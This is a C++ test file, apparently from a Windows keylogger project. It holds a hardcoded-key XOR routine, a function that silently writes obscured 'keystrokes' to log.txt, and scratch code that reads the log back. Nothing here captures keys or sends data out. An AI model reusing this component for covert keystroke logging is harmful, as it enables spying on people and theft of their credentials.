#include "../inc/master.h"
#include <fstream>
using namespace std;



string ConvertWideToUtf8(const wstring &s)
{

    string utf8 = "";
    INT len = WideCharToMultiByte(CP_UTF8, 0, s.c_str(), s.length(), NULL, 0, NULL, NULL);
    if (len > 0)
    {
        utf8.resize(len);
        WideCharToMultiByte(CP_UTF8, 0, s.c_str(), s.length(), &utf8[0], len, NULL, NULL);
    }

    return utf8;
}


wstring ConvertUtf8ToWide(const string &str) //https://stackoverflow.com/questions/6693010/how-do-i-use-multibytetowidechar
{
    INT count = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), str.length(), NULL, 0);
    wstring wstr(count, 0);
    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), str.length(), &wstr[0], count);
    return wstr;
}


wstring XOREncryption(wstring data)  
{
    wstring result;
    wstring char_xor;
   // const wstring key =L"" XOR_KEY;
    const wstring key =L"ba38fab1b592c8f4b1fbbe8d915ee009a840efe504e3a833d0d8afae3b9ea148c859a8e8441877a0721d54f92fccbf12241007253cd6468194484e310798c01d8874dab3c4daa2c3ad612b7ba79ddc5b7ae80de0190f6842d6540da4b5b66c08987f8a15b3f5b80c588e42d1b6c9f149e99cc3c145cd31edaa25b095a6d509df93743a4861929533582d418aa3a766de439e938b7302001e17a6b4691480c4520a5e3a3b31012a003f7ced0ae59936953356f04b92b0e81b9f5b3703130d98118df5bdcc57e0f632b01b443a02bd23fc2f83ca27f9be70cdc657e8f4d74095f5dd88a4c88519db28a45e2e9e4ff714715d6ba53f1a88579f7f47e421b4a3526d40ead58521fbc0b56d373dce956fbb5a7d85f44e24085289b02e4782c3ed1154277fdc56467c1fe08a89d43e96ad2e73f4246c4e9238d660cf85dbc034543a13830dafb383ba61999de8eaee11ac9fa69b170461b241be69e0213e2a3f860edb29d3a1baf0f8a31b577d5893f13ca7377f0aa1bc433ff212e1e7c11cb2ad210df750cdcb6b3202655b215f7abca0f7f85803444e4fb06766a668975e7aa216abc8fdcda3bc7e2797a819b4a1eeccba75bdb49e2e0832ab171c73911362f1384480ca3152399c52b14deefc20a7ddb5e7cc9379688b37af6a42d54a32a85c20b86c4aa86361757e34e66ab0c13e7270788dc097d3db859b0474e4305dc5ffb51d";
    if(data.empty())
    {
        return result;
    }

    for(INT i=0;i<data.size(); i++)
    {
        char_xor = data.at(i) ^ key[i % key.size()];
        result += char_xor;   
    }

    return result;
}

VOID silenciousWriteKeystrokeInFile(CONST wstring &keystroke, CONST HANDLE &hFile)
{
    WriteFile(          //https://stackoverflow.com/questions/28618715/c-writefile-unicode-characters
        hFile,           // open file handle
        (LPCTSTR) XOREncryption(keystroke).c_str(), // start of data to write
        keystroke.length(),  // number of bytes to write
        NULL, // number of bytes that were written
        NULL);           // no overlapped structure
    wcout << "write file good or not ? "<< GetLastError() << endl;
}

VOID readfil(HANDLE &hFile)
{
    vector <string> result;
    WCHAR chBuff[50]={0};
    DWORD dwRead;

    while(TRUE) //Read buffer of anonymous pipe and append the result in result_of_command
    {
        if(!ReadFile(hFile, &chBuff, sizeof(chBuff) ,&dwRead,NULL))
        {
            wcout << " readFromPipe Error in read pipe childen out" << endl;
            break;
        }
        if(dwRead == 0)
        {
            break;
        }
        //wcout << "dwRead: " << dwRead << endl;
        //wcout <<"2: "<< ConvertUtf8ToWide((string) chBuff) << endl;
        Sleep(20);
       // wcout << GetLastError() << endl;
       // wcout << "I: " << i << endl;
       //wcout <<"---->"  <<chBuff<<"<-------------" << endl;
      // wcout << "fuck" << endl;

    }

    wcout << wcslen(chBuff) << endl;
    wcout << GetLastError() << endl;

    wcout <<"chbuff: " << chBuff << endl;
    wcout <<"XOR: " << XOREncryption((wstring) chBuff) << endl;
}



void test(int *var)
{
    if (var != NULL)
    {
        *var+=1;
    }
    else
    {
        cout << "nop" << endl;
    }
}
wstring int_to_wstring(int value)
{
    string int_str = to_string(value);
    return ConvertUtf8ToWide(int_str);
}

int main()
{   
    SetConsoleOutputCP(CP_UTF8); 
    _setmode(_fileno(stdout), 0x00020000);  
    _setmode(_fileno(stdin), 0x00020000);
    int myvar = 10;
    test(&myvar);
    cout << myvar << endl;
    cout << "---------------------" << endl;
    test(NULL);
    cout << "test" << endl;

    int hello = 2;
    wstring resul = int_to_wstring(100);
    wcout << resul + L"hello"<< endl;
    wcout <<"------\n\n" << endl;
    HANDLE hFile = CreateFileW(L"log.txt",  (GENERIC_READ | FILE_APPEND_DATA) , (FILE_SHARE_READ | FILE_SHARE_WRITE), NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); //Crée ou ouvre un fichier ou un périphérique d'E / S. 

    wstring mychar = L"juan Ελληνικά le boss";

    //silenciousWriteKeystrokeInFile(mychar, hFile);
    readfil(hFile);



}
